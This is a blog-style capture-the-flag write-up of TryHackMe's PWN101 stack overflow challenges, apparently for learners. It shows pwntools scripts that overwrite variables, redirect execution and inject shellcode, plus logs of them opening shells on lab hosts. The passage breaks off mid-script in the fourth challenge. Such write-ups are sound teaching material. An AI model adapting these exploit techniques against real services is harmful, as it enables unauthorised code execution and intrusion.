@@ -1,0 +1,703 @@
+I"��<blockquote>
+  <p>Void XD</p>
+</blockquote>
+
+<p>This is short writup for <a href="https://tryhackme.com/room/pwn101">PWN101</a> (Beginner level binary exploitation challenges.) on <a href="https://tryhackme.com">tryhackme</a>
+Go check it out.</p>
+
+<h2 id="challenge-1---pwn101">Challenge 1 - pwn101</h2>
+
+<p>This should give you a start: ‘AAAAAAAAAAA’</p>
+
+<p>Challenge is running on port 9001</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Basic file check</span>
+
+file pwn101.pwn101 
+pwn101.pwn101: ELF 64-bit LSB pie executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="k">for </span>GNU/Linux 3.2.0, BuildID[sha1]<span class="o">=</span>dd42eee3cfdffb116dfdaa750dbe4cc8af68cf43, not stripped
+
+
+checksec pwn101.pwn101 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/kali/TryHackMe/PWN101/chall1/pwn101.pwn101'</span>
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+
+<span class="nb">chmod</span> +x pwn101.pwn101
+
+<span class="c"># Executing binary to find more</span>
+
+./pwn101.pwn101
+       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
+        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
+        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
+                 pwn 101          
+
+Hello!, I am going to shopping.
+My mom told me to buy some ingredients.
+Ummm.. But I have low memory capacity, So I forgot most of them.
+Anyway, she is preparing Briyani <span class="k">for </span>lunch, Can you <span class="nb">help </span>me to buy those items :D
+
+Type the required ingredients to make briyani: 
+<span class="nb">test
+</span>Nah bruh, you lied me :<span class="o">(</span>
+She did Tomato rice instead of briyani :/
+
+So it needs some special input.
+</code></pre></div></div>
+
+<p>Using ghidra to get the source code</p>
+
+<p><img src="https://raw.githubusercontent.com/VOiD-Ayush/new_blog/main/all_collections/_posts/images/pwn101.png" alt="pwn101.png" /></p>
+
+<p>Here we can clearly see its checking if preset_value is 1337 if its not so we get shell.</p>
+
+<p>So the objective is to rewrite preset_value to something other than 1337</p>
+
+<p>As we are taking input from gets which is a dangerous function as it dosent limit in user input</p>
+
+<p>Entering more characters than the input_buffer accepts will overwrite the preset_value.</p>
+
+<p>Our exploit</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># simple pwntools script
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="mi">100</span>
+
+<span class="n">write</span><span class="p">(</span><span class="s">"payload.txt"</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Running the exploit</span>
+<span class="o">(</span><span class="nb">cat </span>payload.txt<span class="p">;</span><span class="nb">cat</span><span class="o">)</span> | nc 10.10.206.5 9001
+       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
+        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
+        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
+                 pwn 101          
+
+Hello!, I am going to shopping.
+My mom told me to buy some ingredients.
+Ummm.. But I have low memory capacity, So I forgot most of them.
+Anyway, she is preparing Briyani <span class="k">for </span>lunch, Can you <span class="nb">help </span>me to buy those items :D
+
+Type the required ingredients to make briyani: 
+
+Thanks, Heres a small gift <span class="k">for </span>you &lt;3
+
+<span class="nb">ls
+</span>flag.txt
+pwn101
+pwn101.c
+<span class="nb">cat </span>flag.txt
+THM<span class="o">{</span>fake_flag<span class="o">}</span>   <span class="c"># get you own flag</span>
+
+</code></pre></div></div>
+
+<h2 id="challenge-2---pwn102">Challenge 2 - pwn102</h2>
+
+<p>The challenge is running on port 9002</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Basic file checks</span>
+
+file pwn102.pwn102 
+pwn102.pwn102: ELF 64-bit LSB pie executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="k">for </span>GNU/Linux 3.2.0, BuildID[sha1]<span class="o">=</span>2612b87a7803e0a8af101dc39d860554c652d165, not stripped
+
+checksec pwn102.pwn102 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/kali/TryHackMe/PWN101/chall2/pwn102.pwn102'</span>
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+
+
+<span class="c"># Executing binary to get more info</span>
+./pwn102.pwn102 
+       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
+        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
+        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
+                 pwn 102          
+
+I need badf00d to fee1dead
+Am I right? <span class="nb">test
+</span>I<span class="s1">'m feeling dead, coz you said I need bad food :(
+
+</span></code></pre></div></div>
+
+<p>Using ghidra again to decomplie the source code.</p>
+
+<p><img src="https://raw.githubusercontent.com/VOiD-Ayush/new_blog/main/all_collections/_posts/images/pwn102.png" alt="pwn102.png" /></p>
+
+<p>This time there are two preset value with value 0xbadf00d and 0xfee1dead we have to rewrite them to 0xc0ff33 and 0xc0d3</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Using gdb to get the offset <span class="k">for </span>these comparisions
+
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/TryHackMe/PWN101/chall2]
+└─<span class="nv">$ </span>cyclic <span class="nt">-l</span> caab
+108
+                                                                                                                                                                                              
+
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/TryHackMe/PWN101/chall2]
+└─<span class="nv">$ </span>cyclic <span class="nt">-l</span> baab
+104
+</code></pre></div></div>
+
+<p>Our exploit</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># /chall2/get_shell.py
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">exe</span> <span class="o">=</span> <span class="s">'./pwn102.pwn102'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">exe</span><span class="p">,</span><span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>  <span class="c1"># Set GDBscript below
+</span>        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>  <span class="c1"># ('server', 'port')
+</span>        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>  <span class="c1"># Run locally
+</span>        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+
+
+<span class="c1"># rbp - 4 = 108
+# rbp - 8 = 104
+</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x90</span><span class="s">"</span><span class="o">*</span><span class="mi">104</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xc0d3</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xc0ff33</span><span class="p">)</span>
+
+<span class="n">write</span><span class="p">(</span><span class="s">"payload.txt"</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span> 
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 get_shell.py REMOTE 10.10.145.112 9002
+<span class="o">[</span>+] Opening connection to 10.10.145.112 on port 9002: Done
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
+       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
+        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
+        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
+                 pwn 102          
+
+I need badf00d to fee1dead
+Am I right? Yes, I need c0ff33 to c0d3
+<span class="nv">$ </span><span class="nb">ls
+</span>flag.txt
+pwn102
+pwn102.c
+<span class="nv">$ </span><span class="nb">cat </span>flag.txt
+THM<span class="o">{</span>fake_flag<span class="o">}</span>   <span class="c"># get you own flag</span>
+</code></pre></div></div>
+
+<h2 id="challenge-3---pwn103">Challenge 3 - pwn103</h2>
+
+<p>The challenge is running on port 9003</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># basic file checks</span>
+
+file pwn103.pwn103                                   
+pwn103.pwn103: ELF 64-bit LSB executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]<span class="o">=</span>3df2200610f5e40aa42eadb73597910054cf4c9f, <span class="k">for </span>GNU/Linux 3.2.0, not stripped
+
+
+checksec pwn103.pwn103 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/kali/TryHackMe/PWN101/chall3/pwn103.pwn103'</span>
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
+
+<span class="c"># Executing binary to get more info </span>
+
+./pwn103.pwn103
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⡟⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⢹⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⠄⢠⣴⣾⣵⣶⣶⣾⣿⣦⡄⠄⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⢀⣾⣿⣿⢿⣿⣿⣿⣿⣿⣿⡄⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⢸⣿⣿⣧⣀⣼⣿⣄⣠⣿⣿⣿⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⠘⠻⢷⡯⠛⠛⠛⠛⢫⣿⠟⠛⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⣧⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢡⣀⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣆⣸⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+
+  <span class="o">[</span>THM Discord Server]
+
+➖➖➖➖➖➖➖➖➖➖➖
+1<span class="o">)</span> 📢 Announcements
+2<span class="o">)</span> 📜 Rules
+3<span class="o">)</span> 🗣  General
+4<span class="o">)</span> 🏠 rooms discussion
+5<span class="o">)</span> 🤖 Bot commands
+➖➖➖➖➖➖➖➖➖➖➖
+⌨️  Choose the channel: 
+
+<span class="c"># checking different options for finding vuln</span>
+
+Choose the channel: 3
+
+🗣  General:
+
+<span class="nt">------</span><span class="o">[</span>jopraveen]: Hello pwners 👋
+<span class="nt">------</span><span class="o">[</span>jopraveen]: Hope youre doing well 😄
+<span class="nt">------</span><span class="o">[</span>jopraveen]: You found the vuln, right? 🤔
+
+<span class="nt">------</span><span class="o">[</span>pwner]: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Try harder!!! 💪
+zsh: segmentation fault  ./pwn103.pwn103
+
+<span class="c"># overflow vuln detected here</span>
+</code></pre></div></div>
+
+<p>Ghidra Analysis give these two important functions</p>
+
+<p><img src="https://raw.githubusercontent.com/VOiD-Ayush/new_blog/main/all_collections/_posts/images/pwn103_admins_only.png" alt="pwn103_admins_only.png" /></p>
+
+<p><img src="https://raw.githubusercontent.com/VOiD-Ayush/new_blog/main/all_collections/_posts/images/pwn103_general.png" alt="pwn103_general.png" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># important function</span>
+
+0x0000000000401554  admins_only
+
+
+pwndbg&gt; cyclic 100
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+
+
+RBP  0x6161616a61616169 <span class="o">(</span><span class="s1">'iaaajaaa'</span><span class="o">)</span>
+RSP  0x7fffffffde08 ◂— <span class="s1">'kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'</span>
+
+<span class="c"># finding the overflow offset</span>
+pwndbg&gt; cyclic <span class="nt">-l</span> kaaa
+40
+
+</code></pre></div></div>
+
+<p>Our Exploit</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># /chall3/get_shell.py
+#!/usr/bin/env python3
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">exe</span> <span class="o">=</span> <span class="s">'./pwn103.pwn103'</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">exe</span><span class="p">,</span><span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+<span class="c1"># context.log_level=''
+</span>
+<span class="c1"># Many built-in settings can be controlled on the command-line and show up
+# in "args".  For example, to dump all data sent/received, and disable ASLR
+# for all created processes...
+# ./exploit.py DEBUG NOASLR
+</span>
+
+<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>  <span class="c1"># Set GDBscript below
+</span>        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>  <span class="c1"># ('server', 'port')
+</span>        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>  <span class="c1"># Run locally
+</span>        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+
+<span class="c1"># Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+</span><span class="n">gdbscript</span> <span class="o">=</span> <span class="s">'''
+gdb
+continue
+'''</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>
+
+<span class="c1">#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+</span>
+<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+
+<span class="n">padding</span> <span class="o">=</span> <span class="mi">40</span>
+<span class="n">admins_only</span> <span class="o">=</span> <span class="mh">0x0000000000401554</span>
+
+<span class="n">payload</span><span class="o">=</span><span class="n">flat</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s">"nop"</span><span class="p">)</span><span class="o">*</span><span class="n">padding</span><span class="p">,</span><span class="mh">0x401016</span><span class="p">,</span><span class="n">admins_only</span><span class="p">)</span>
+
+<span class="c1"># adding a return gadget in between to fix movaps issue
+# Thanks to Razvi for helping me to find this
+</span>
+<span class="n">write</span><span class="p">(</span><span class="s">"payload.txt"</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">().</span><span class="n">decode</span><span class="p">())</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'3'</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">().</span><span class="n">decode</span><span class="p">())</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"[pwner]:"</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">().</span><span class="n">decode</span><span class="p">())</span>
+
+<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Running the payload</span>
+
+python3 get_shell.py REMOTE 10.10.145.112 9003
+<span class="o">[</span>+] Opening connection to 10.10.145.112 on port 9003: Done
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⡟⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⢹⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⠄⢠⣴⣾⣵⣶⣶⣾⣿⣦⡄⠄⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⢀⣾⣿⣿⢿⣿⣿⣿⣿⣿⣿⡄⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⢸⣿⣿⣧⣀⣼⣿⣄⣠⣿⣿⣿⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⠘⠻⢷⡯⠛⠛⠛⠛⢫⣿⠟⠛⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⣧⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢡⣀⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣆⣸⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+
+  <span class="o">[</span>THM Discord Server]
+
+➖➖➖➖➖➖➖➖➖➖➖
+1<span class="o">)</span> 📢 Announcements
+2<span class="o">)</span> 📜 Rules
+3<span class="o">)</span> 🗣  General
+4<span class="o">)</span> 🏠 rooms discussion
+5<span class="o">)</span> 🤖 Bot commands
+➖➖➖➖➖➖➖➖➖➖➖
+⌨️  Choose the channel: 
+/home/kali/TryHackMe/PWN101/chall3/get_shell.py:47: BytesWarning: Text is not bytes<span class="p">;</span> assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  io.sendline<span class="o">(</span><span class="s1">'3'</span><span class="o">)</span>
+
+🗣  General:
+
+ 
+Try harder!!! 💪
+
+
+👮  Admins only:
+
+Welcome admin 😄
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
+<span class="nv">$ </span><span class="nb">ls
+</span>flag.txt
+pwn103
+pwn103.c
+<span class="nv">$ </span><span class="nb">cat </span>flag.txt
+THM<span class="o">{</span>fake_flag<span class="o">}</span>   <span class="c"># get you own flag</span>
+</code></pre></div></div>
+
+<h2 id="challenge-4---pwn104">Challenge 4 - pwn104</h2>
+
+<p>Challenge is running on port 9004</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Basic file check </span>
+
+file pwn104.pwn104    
+pwn104.pwn104: ELF 64-bit LSB executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]<span class="o">=</span>60e0bab59b4e5412a1527ae562f5b8e58928a7cb, <span class="k">for </span>GNU/Linux 3.2.0, not stripped
+
+checksec pwn104.pwn104 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/kali/TryHackMe/PWN101/chall4/pwn104.pwn104'</span>
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
+    RWX:      Has RWX segments
+
+<span class="c"># Running the file for more info</span>
+./pwn104.pwn104 
+       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
+        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
+        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
+                 pwn 104          
+
+I think I have some super powers 💪
+especially executable powers 😎💥
+
+Can we go <span class="k">for </span>a fight? 😏💪
+I<span class="s1">'m waiting for you at 0x7ffcb9eec270
+test
+
+</span></code></pre></div></div>
+
+<p>Again ghidra for analysis</p>
+
+<p><img src="https://raw.githubusercontent.com/VOiD-Ayush/new_blog/main/all_collections/_posts/images/pwn104.png" alt="pwn104.png" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># finding the rip offset</span>
+
+RBP  0x6161617661616175 <span class="o">(</span><span class="s1">'uaaavaaa'</span><span class="o">)</span>
+RSP  0x7fffffffde28 ◂— 0x6161617861616177 <span class="o">(</span><span class="s1">'waaaxaaa'</span><span class="o">)</span>
+
+pwndbg&gt; cyclic <span class="nt">-l</span> waaa
+88
+
+</code></pre></div></div>
+
+<p>Our Exploit</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># /chall4/get_shell.py
+</span>
+<span class="c1">#!/usr/bin/env python3
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">exe</span> <span class="o">=</span> <span class="s">'./pwn104.pwn104'</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">exe</span><span class="p">,</span><span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+<span class="c1"># context.log_level='debug'
+</span>
+<span class="c1"># Many built-in settings can be controlled on the command-line and show up
+# in "args".  For example, to dump all data sent/received, and disable ASLR
+# for all created processes...
+# ./exploit.py DEBUG NOASLR
+</span>
+
+<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>  <span class="c1"># Set GDBscript below
+</span>        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>  <span class="c1"># ('server', 'port')
+</span>        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>  <span class="c1"># Run locally
+</span>        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+
+<span class="c1"># Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+</span><span class="n">gdbscript</span> <span class="o">=</span> <span class="s">'''
+continue
+'''</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>
+
+<span class="c1">#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+</span>
+<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+
+<span class="n">padding</span> <span class="o">=</span> <span class="mi">88</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">sh</span><span class="p">())</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="nb">exit</span><span class="p">())</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'at '</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
+
+<span class="n">leaked_address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
+
+<span class="n">info</span><span class="p">(</span><span class="s">"leaked_address : %#x"</span><span class="p">,</span><span class="n">leaked_address</span><span class="p">)</span>
+
+<span class="n">payload</span><span class="o">=</span><span class="n">flat</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s">'nop'</span><span class="p">)</span><span class="o">*</span><span class="n">padding</span><span class="p">,</span><span class="n">leaked_address</span><span class="o">+</span><span class="mi">100</span><span class="p">,</span><span class="n">asm</span><span class="p">(</span><span class="s">'nop'</span><span class="p">)</span><span class="o">*</span><span class="mi">40</span><span class="p">,</span><span class="n">shellcode</span><span class="p">)</span>
+
+
